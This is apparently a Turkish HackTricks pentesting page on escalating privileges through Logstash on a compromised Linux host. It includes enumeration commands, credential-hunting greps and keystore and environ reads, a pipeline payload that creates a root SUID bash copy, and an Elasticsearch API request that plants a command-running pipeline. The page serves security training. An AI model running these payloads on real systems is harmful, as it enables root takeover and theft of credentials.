# Logstash Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash, **pipeline** olarak bilinen bir sistem üzerinden **logları toplamak, dönüştürmek ve dağıtmak** için kullanılır. Bu pipeline'lar **input**, **filter** ve **output** aşamalarından oluşur.<sup>[[4]](#references)</sup> Logstash'ın ele geçirilmiş bir makinede çalışması ilginç bir durum ortaya çıkarır.

### Pipeline Yapılandırması

Debian ve RPM package kurulumlarında pipeline'lar, pipeline yapılandırmalarının konumlarını listeleyen **/etc/logstash/pipelines.yml** üzerinden yapılandırılır; diğer dağıtımlar `pipelines.yml` dosyasını Logstash'in `path.settings` dizinine yerleştirir.<sup>[[5]](#references)[[6]](#references)</sup>
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Bu dosya, pipeline yapılandırmalarını içeren **.conf** dosyalarının konumunu ortaya çıkarır. **Elasticsearch output** kullanılırken `user`/`password`, `cloud_auth` veya `api_key` ayarlarını inceleyin; hesabın etkin ayrıcalıkları Elasticsearch'e bağlıdır. Bir `path.config` glob'u, o pipeline için eşleşen tüm dosyaları yükler.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Logstash, `pipelines.yml` yerine `-f <directory>` ile başlatılırsa `-f` önceliklidir ve **bu dizindeki tüm dosyalar sözlükbilimsel sırayla birleştirilir ve tek bir config olarak ayrıştırılır**.<sup>[[6]](#references)[[7]](#references)</sup> Bu durum saldırı açısından 2 sonuç doğurur:

- `000-input.conf` veya `zzz-output.conf` gibi bırakılan bir dosya, nihai pipeline'ın nasıl oluşturulduğunu değiştirebilir
- Hatalı biçimlendirilmiş bir dosya, birleştirilmiş config'in doğrulamasının başarısız olmasına neden olabilir; yeniden yükleme sırasında Logstash önceki pipeline'ı korur, bu nedenle auto-reload'a güvenmeden önce payload'ları doğrulayın.<sup>[[1]](#references)</sup>

### Güvenliği İhlal Edilmiş Host'ta Hızlı Enumeration

Logstash'ın kurulu olduğu bir sistemde hızlıca şunları inceleyin:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Yerel monitoring API'sine erişilebildiğini de kontrol edin. Varsayılan olarak **127.0.0.1:9600** adresine bağlanır; bu, host'a erişim sağladıktan sonra genellikle yeterlidir.<sup>[[8]](#references)</sup>
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Bu endpoint'ler pipeline ID'lerini ve ayarlarını, runtime metriklerini ve config-reload başarı/başarısızlık sayaçlarını açığa çıkararak bir değişikliğin kabul edilip edilmediğini doğrulamaya yardımcı olur.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Kurtarılan bir credential **Elasticsearch**'ı hedefliyorsa, [Elasticsearch hakkındaki bu diğer sayfaya](../../network-services-pentesting/9200-pentesting-elasticsearch.md) göz atın.

### Yazılabilir Pipelines Üzerinden Privilege Escalation

Privilege Escalation denemek için önce Logstash servisinin gerçekte hangi kullanıcı altında çalıştığını belirleyin; bunun root veya **logstash** kullanıcısı olduğunu varsaymayın. Aşağıdaki kriterlerden **birini** karşıladığınızdan emin olun:

- Bir pipeline **.conf** dosyasına **write access** sahibi olmak **veya**
- **/etc/logstash/pipelines.yml** dosyası bir wildcard kullanıyor ve hedef klasöre yazabiliyor olmak.<sup>[[6]](#references)[[7]](#references)</sup>

Ek olarak, aşağıdaki koşullardan **biri** karşılanmalıdır:

- Logstash servisini restart etme yeteneği **veya**
- **/etc/logstash/logstash.yml** dosyasında **config.reload.automatic: true** ayarının bulunması.<sup>[[1]](#references)[[15]](#references)</sup>

Konfigürasyonda bir wildcard bulunması durumunda, bu wildcard ile eşleşen bir dosya oluşturmak command execution sağlar.<sup>[[7]](#references)[[9]](#references)</sup> Örneğin:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Burada **interval**, saniye cinsinden çalıştırma sıklığını belirler. Verilen örnekte **whoami** komutu her 120 saniyede bir çalışır ve çıktısı **/tmp/output.log** dosyasına yönlendirilir.<sup>[[9]](#references)</sup>

**/etc/logstash/logstash.yml** içinde **config.reload.automatic: true** olduğunda Logstash, yeniden başlatmaya gerek kalmadan yeni veya değiştirilmiş pipeline yapılandırmalarını otomatik olarak algılar ve uygular.<sup>[[1]](#references)[[15]](#references)</sup> Wildcard yoksa mevcut yapılandırmalarda yine değişiklik yapılabilir, ancak kesintileri önlemek için dikkatli olunması önerilir.

### Daha Güvenilir Pipeline Payload'ları

`exec` input plugin'i güncel sürümlerde hâlâ çalışır ve bir **interval** veya **schedule** gerektirir. Logstash JVM'ini **fork** ederek çalıştığından, bellek yetersizse payload sessizce çalışmak yerine `ENOMEM` hatasıyla başarısız olabilir.<sup>[[9]](#references)</sup>

Servis, root-owned bir SUID dosyası oluşturmak için yeterli ayrıcalıklara sahip olduğunda, pratik bir privilege-escalation payload'ı kalıcı bir artifact bırakan payload'dır:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Yeniden başlatma yetkiniz yoksa ancak prosese signal gönderebiliyorsanız, Logstash Unix benzeri sistemlerde **SIGHUP** tetiklemeli reload işlemini de destekler:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Her plugin'in reload-friendly olmadığını unutmayın. Örneğin, **stdin** input'u automatic reload'u engeller; bu nedenle `config.reload.automatic` seçeneğinin değişikliklerinizi her zaman algılayacağını varsaymayın.<sup>[[1]](#references)</sup>

### Logstash'ten Secret Çalma

Yalnızca code execution'a odaklanmadan önce, Logstash'in zaten erişebildiği verileri toplayın:

- Credentials, `elasticsearch {}` output'larında, `http_poller` URL'lerinde/settings'lerinde, JDBC input'larında veya cloud ile ilgili settings'lerde görünebilir; bu plugin'ler aranması gereken credential alanlarını açığa çıkarır.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Secure settings, **`/etc/logstash/logstash.keystore`** dosyasında veya başka bir `path.settings` directory'sinde bulunabilir.<sup>[[5]](#references)[[10]](#references)</sup>
- Keystore password, **`LOGSTASH_KEYSTORE_PASS`** üzerinden sağlanabilir ve RPM/DEB install'ları service environment variable'larını **`/etc/sysconfig/logstash`** dosyasından source eder.<sup>[[10]](#references)</sup>
- `${VAR}` ile environment-variable expansion, Logstash startup sırasında çözülür; bu nedenle service environment'ını incelemeye değer.<sup>[[14]](#references)</sup>

Faydalı kontroller:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Bu da kontrol edilmeye değerdir; çünkü **CVE-2023-46672**, belirli koşullar altında Logstash'in keystore'da depolanan ve configuration'dan referans verilen secret'lar dahil olmak üzere hassas bilgileri log'larına kaydettiğini gösterdi; bu koşullar geçerli olabilecekse eski Logstash log'larını ve `journald` girdilerini inceleyin.<sup>[[3]](#references)</sup>

### Merkezi Pipeline Yönetiminin Kötüye Kullanılması

Bazı ortamlarda host, yerel `.conf` dosyalarına hiç güvenmez. **`xpack.management.enabled: true`** yapılandırılmışsa Logstash, merkezi olarak yönetilen pipeline'ları Elasticsearch/Kibana'dan çekebilir ve bu mod etkinleştirildikten sonra yerel pipeline config'leri artık doğruluk kaynağı olmaz.<sup>[[2]](#references)</sup>

Bu, farklı bir attack path anlamına gelir:

1. Elastic kimlik bilgilerini yerel Logstash ayarlarından, keystore'dan veya log'larından kurtarın.<sup>[[3]](#references)[[10]](#references)</sup>
2. Hesabın **`manage_logstash_pipelines`** cluster privilege'ına sahip olup olmadığını doğrulayın.<sup>[[16]](#references)</sup>
3. Merkezi olarak yönetilen bir pipeline oluşturun veya mevcut olanı değiştirin; böylece Logstash host'u bir sonraki poll interval'ında payload'unuzu çalıştırır.<sup>[[2]](#references)[[16]](#references)</sup>

Bu özellik için kullanılan Elasticsearch API'si şöyledir:<sup>[[16]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"last_modified": "2026-01-02T02:50:51.250Z",
"username": "user",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {
"pipeline.workers": 1,
"pipeline.batch.size": 1,
"pipeline.batch.delay": 50,
"queue.type": "memory",
"queue.max_bytes": "1gb",
"queue.checkpoint.writes": 1024
}
}'
```
Bu, yerel dosyaların salt okunur olduğu ancak Logstash'in pipeline'ları uzaktan çekmek üzere zaten kayıtlı olduğu durumlarda özellikle kullanışlıdır.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Yapılandırma Dosyasını Yeniden Yükleme](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Merkezi Pipeline Yönetimini Yapılandırma](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 Güvenlik Güncellemesi (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Logstash Pipeline'ı Oluşturma](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Logstash Dizin Düzeni](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Birden Çok Pipeline](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Logstash'i Komut Satırından Çalıştırma](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: API'lerle Logstash'i İzleme](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Exec input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Güvenli Ayarlar için Secrets keystore](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Elasticsearch output plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Http_poller input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Jdbc input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Ortam Değişkenlerini Kullanma](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Bir Logstash pipeline'ı Oluşturma veya Güncelleme](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: Pipeline'lar için Ayarları Alma](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: Pipeline'lar için İstatistikleri Alma](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
